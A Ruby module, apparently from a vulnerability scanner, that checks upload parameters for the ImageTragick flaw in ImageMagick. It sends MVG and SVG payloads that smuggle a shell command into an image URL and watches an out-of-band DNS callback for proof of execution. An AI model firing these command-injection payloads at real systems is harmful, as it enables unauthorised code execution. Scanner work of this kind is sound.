require 'cgi'

module ScannerExtensions
  module Extensions
    class ImageTragick < BaseExtension
      def initialize
        @type                = :detect
        @general_object_type = :param
        @extension_type      = :vuln
        @detect_type         = :rce
        @point               = ->(p) { p.to_a.last.to_s == 'file' }

        @defaults = {
          timeout: 15,
          sleep: 15
        }

        @payloads = [
          # Worked for me exploit, without semicolon
          ERB.new(
            <<-fin.margin
              |push graphic-context
              |viewbox 0 0 640 480
              |fill 'url(https://example.com/image.jpg"|ping -c 1 <%= token %>")'
              |pop graphic-context
            fin
          ),
          # Original exploit
          # ERB.new(
          #  <<-fin.margin
          #    |push graphic-context
          #    |viewbox 0 0 640 480
          #    |fill 'url(https://example.com/image.jpg";|ping -c 1 <%= token %>")'
          #    |pop graphic-context
          #  fin
          # ),
          # Another payload
          ERB.new(
            <<-fin.margin
              |<?xml version="1.0" standalone="no"?>
              |<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
              |"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
              |<svg width="640px" height="480px" version="1.1"
              |xmlns="http://www.w3.org/2000/svg"; xmlns:xlink=
              |"http://www.w3.org/1999/xlink";>
              |<image xlink:href="https://example.com/image.jpg&quot;|ping -c 2 <%= token %>&quot;"
              |x="0" y="0" height="640px" width="480px"/>
              |</svg>
            fin
          )
        ]
      end

      def oob_callback(object, tokens)
        tokens.each do |token, data|
          array = ScannerExtensions::Helpers::OobDnsClient.get token
          next if array.empty?
          curl = object.curl_helper(value: data)
          object.vuln(
            extension: 'image_tragick',
            template: '/rce/image_tragick',
            binding: :protocol,
            args: {
              exploit_example: curl,
              footers: {
                exploit_example: {
                  view: 'oob_dns',
                  splitter: "\n",
                  params: {
                    hosts: array
                  }
                }
              }
            }
          )
          return object
        end
        return nil
      end

      def run(object, params)
        params = @defaults.merge(params)

        tokens = []

        for payload in @payloads do
          token = ScannerExtensions::Helpers::OobDnsClient.create
          data  = payload.result(Kernel.binding)

          object.http(value: data, timeout: params[:timeout], open_timeout: params[:open_timeout])

          tokens << [token, data]
        end

        if object.oob_callbacks
          object.oob_callbacks << Proc.new do
            oob_callback(object, tokens)
          end
        else
          sleep params[:sleep]
          oob_callback(object, tokens)
        end
      end
    end
  end
end
